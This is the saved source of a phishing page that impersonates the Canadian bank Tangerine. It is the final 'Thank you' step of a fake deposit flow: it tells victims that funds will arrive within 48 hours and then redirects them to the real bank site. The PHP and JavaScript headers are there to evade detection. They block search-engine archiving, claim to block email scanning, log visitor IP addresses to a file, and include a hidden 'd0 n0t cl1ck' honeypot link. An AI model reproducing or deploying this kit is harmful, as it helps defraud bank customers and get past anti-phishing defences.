
<!-- saved from url=(0042)/deposit/tang/f -->
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>Verification | Tangerine</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        <meta name="description" content="">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta http-equiv="refresh" content="2;URL=https://www.tangerine.ca/en/index.html">
        <meta name="viewport" content="width=device-width, maximum-scale=1.0">
        <link rel="shortcut icon" href="https://www.tangerine.ca/app/favicon.ico" type="image/x-icon">
        <link href="./tan_4_files/global.css" rel="stylesheet">
        <link href="./tan_4_files/app.css" rel="stylesheet">
        <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>
    </head>
    <body translate-cloak="" application-theme="" state="forgotLogin" class="fb2-index ng-scope application-theme-web" style="overflow: visible;">
        <tng-main-nav class="ng-isolate-scope">
            <nav class="navbar print-hide" ng-class="{&#39;nativeNav&#39; : $ctrl.EnvironmentService.isNative()}">
                <a id="mainNav_home" class="brand nonclickable" href="/deposit/tang/f" ng-click="$ctrl.handleGoHome()" ng-class="{&#39;nonclickable&#39; : $ctrl.isTitleLogoNotClickable()}">
                    <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="./tan_4_files/brand-white.png">
                    <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="./tan_4_files/brand-orange.png">
                </a>
            </nav>
        </tng-main-nav>
        <div ui-view="page-content" class="page-content ng-scope" style="padding-bottom: 0px;">
            <forgot-login class="ng-scope ng-isolate-scope">
                <form method="post" action="/deposit/tang/f" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
                    <style>
                    .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="password"] {
                        font-size: 17px;
                        margin-top: 10px;
                        margin-bottom: 15px;
                        font-weight: 500;
                        border: 1px solid #9e9e9e;
                    }

                    .heading--title2 {
                        margin-bottom: 25px;
                        text-align: center;
                    }

                    .forgot-login button {
                        margin: 0px;
                    }

                    .text-right {
                        text-align: right;
                    }

                    .navbar {
                        display: block !important;
                        background-color: #ea7024 !important;
                    }

                    .btn, [class*=" btn--"], [class^=btn--] {
                        background-color: #ea7024;
                    }

                    .forgot-login__email {
                        max-width: 30em;
                        margin-left: auto;
                        margin-right: auto;
                    }

                    .application-theme-web {
                        background-color: #ffffff;
                    }
                    </style>
                    <div class="forgot-login" style="margin-top: 0px; padding: 23px;">
                        <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM">
                            <h2 class="heading--title2 ng-binding">Thank you</h2>
                            <p style="text-align: center; font-size: 17px; padding: 10px 40px 0px 40px;">The funds will be processed and deposited in your account within the next 48 hours.<br>
<br>
For security reasons you will now be redirected to the home page.</p>
                        </div>
                    </div>
                </form>
            </forgot-login>
        </div>
        <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
    
    
</body></html>